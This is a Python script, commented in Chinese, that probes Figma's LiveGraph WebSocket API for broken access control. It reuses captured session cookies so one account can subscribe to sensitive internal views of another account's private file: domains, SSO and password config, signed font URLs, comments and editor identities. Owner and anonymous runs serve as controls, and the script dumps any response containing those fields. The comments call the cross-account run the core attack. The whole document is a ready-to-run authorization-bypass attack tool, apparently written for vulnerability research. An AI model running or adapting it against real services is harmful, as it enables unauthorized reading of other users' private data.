
# -*- coding: utf-8 -*-
"""裸读候选批量实测: B(纯净) 订阅 A 私有文件的高价值 view
矩阵: 纯净B→A_design(核心) / 纯净A→A_design(基线) / 匿名→A_design(对照)
单 WS 连接内连续订阅所有候选 view
"""
import sys, json, io, asyncio, time, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"
A_F2 = "qzDqStIDJyGbthpKiuvfwg"
B_FILE = "xFETb3KJ8wh2U8wjD9jJeY"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def clean_json_cookie_field(raw_value, keep_uid):
    v = urllib.parse.unquote(raw_value)
    try:
        d = json.loads(v)
    except Exception:
        return None
    if not isinstance(d, dict):
        return None
    nd = {k: val for k, val in d.items() if k == keep_uid}
    if not nd:
        return None
    return urllib.parse.quote(json.dumps(nd, separators=(",", ":")))


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    authn_raw = parts.get("__Host-figma.authn", "")
    d = json.loads(urllib.parse.unquote(authn_raw))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        ne = clean_json_cookie_field(parts["__Host-figma.embed"], keep_uid)
        if ne:
            parts["__Host-figma.embed"] = ne
        else:
            del parts["__Host-figma.embed"]
            parts.pop("__Host-figma.embed.mac", None)
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
rawA = io.open("ws_cookie_A_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_A = make_abs_pure(rawA, A_UID)
ABS_B = make_abs_pure(rawB, B_UID)
print(f"ABS_A 含A={A_UID in ABS_A} 含B={B_UID in ABS_A}")
print(f"ABS_B 含B={B_UID in ABS_B} 含A={A_UID in ABS_B}")

# 候选 view 列表: (名称, args)
VIEWS = [
    ("SiteMount", {"fileKey": A_DESIGN}),
    ("SiteBundles", {"fileKey": A_DESIGN}),
    ("SitePublishDomainState", {"fileKey": A_DESIGN}),
    ("WebFontsForFile", {"fileKey": A_DESIGN}),
    ("UserLicensesForFile", {"fileKey": A_DESIGN, "userId": A_UID}),
    ("ResolvedComments", {"fileKey": A_DESIGN}),
    ("WeaveEditLockView", {"fileKey": A_DESIGN, "cacheNonce": "x"}),
    ("WeaveFilePresenceView", {"fileKey": A_DESIGN, "cacheNonce": "x"}),
    ("SlotsFileEnablement", {"fileKey": A_DESIGN}),
    ("StateGroupUpdatesForFile", {"fileKey": A_DESIGN}),
    ("StorybookTileView", {"fileKey": A_DESIGN}),
    ("TestFileCmsCollectionsOrderView", {"fileKey": A_DESIGN}),
    ("WorkspaceSubscribedLibrariesForFile", {"fileKey": A_DESIGN}),
]

SENSITIVE = ["domain", "ssoConfig", "pwdConfig", "customDomain", "signedFontFileUrl",
             "publishedByUser", "connectedPlanUser", "currentPlanUser", "resolvedComments",
             "editorUserId", "editorHandle", "users", "sampleUrl", "siteMount",
             "siteBundles", "webFonts", "slotsEnabled", "scriptOutput"]


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def probe(label, cookie, uid, fk):
    print(f"\n########## {label} ##########", flush=True)
    try:
        async with websockets.connect(lg_url(fk, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            au = None
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    au = json.loads(m).get("userId")
                    break
            print(f"authUserId={au}", flush=True)
            for vname, vargs in VIEWS:
                await ws.send(json.dumps({"messageType": "subscribe", "viewName": vname,
                                          "viewHash": "f" * 32, "loadType": "initial",
                                          "args": vargs}))
                deadline = time.time() + 6
                got = []
                while time.time() < deadline:
                    try:
                        m = await asyncio.wait_for(ws.recv(), timeout=2.5)
                    except asyncio.TimeoutError:
                        break
                    if isinstance(m, str):
                        got.append(m)
                        if "viewLoaded" in m:
                            break
                # 汇总本 view 输出
                sig = "EMPTY"
                for f in got:
                    if "error" in f and "sinatraResolverError" in f:
                        sig = "ERR403" if "403" in f else ("ERR401" if "401" in f else "ERR")
                    elif any(s in f for s in SENSITIVE):
                        sig = "DATA!"
                print(f"  [{vname}] {sig}", flush=True)
                if sig == "DATA!":
                    for f in got:
                        if any(s in f for s in SENSITIVE):
                            print(f"    🖼 {f[:900]}", flush=True)
                elif sig.startswith("ERR"):
                    for f in got:
                        if "sinatraResolverError" in f or "noPermission" in f:
                            print(f"    ⚠ {f[:300]}", flush=True)
                            break
    except Exception as e:
        print(f"  ❌ {type(e).__name__}: {str(e)[:90]}", flush=True)


async def main():
    await probe("纯净B→A_design (核心攻击)", ABS_B, B_UID, A_DESIGN)
    await probe("纯净A→A_design (owner基线)", ABS_A, A_UID, A_DESIGN)
    await probe("匿名→A_design (对照)", "", "0", A_DESIGN)


asyncio.run(main())
